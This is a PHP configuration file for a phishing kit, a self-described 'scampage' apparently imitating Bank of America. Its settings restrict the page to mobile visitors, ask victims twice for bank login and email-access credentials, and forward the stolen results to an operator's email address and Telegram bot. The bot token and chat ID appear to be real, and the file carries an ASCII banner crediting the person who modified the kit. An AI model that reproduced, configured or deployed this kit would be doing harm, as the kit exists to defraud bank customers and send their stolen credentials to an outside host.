<?php
###########################################################################################################

/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$mobileonly             = 1; # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
$createfolderpersession = 0; # <--- CREATE A NEW FOLDER FOR EACH SESSION
$ftpsave                = 0; # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
$sendtoemail            = 1; # <--- SEND RESULTS TO EMAIL
$sendtotg               = 1; # <--- SEND RESULTS TO TELEGRAM
$doubleloginentry       = 1; # <--- REQUEST TWICE FOR LOGIN DETAILS
$confirmemaillog        = 1; # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
$send                   = "youremail@domain.yes,"; # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot                  = "5679119694:AAERY53OlgJIISmFPewkzVrQROuq2V_ubEI"; # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid                 = "-751634473"; # <--- YOUR TELEGRAM CHAT ID
$resultheading          = "FROM YOUS BOA SCAMPAGE"; # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 









#Don't Touch 

$usecaution = 1;
$adminpanel = 1;
$adminpass  = "";


/*
████████╗██╗  ██╗██╗   ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║  ██║╚██╗ ██╔╝██╔════╝██╔════╝██╔════╝
██║   ███████║ ╚████╔╝ ███████╗█████╗  ██║     
██║   ██╔══██║  ╚██╔╝  ╚════██║██╔══╝  ██║     
██║   ██║  ██║   ██║   ███████║███████╗╚██████╗
╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝
*/
# <------- Remod @ThyOnecy<></>

# <-------  SCAMA CONFIGURATION FILE <></>
?>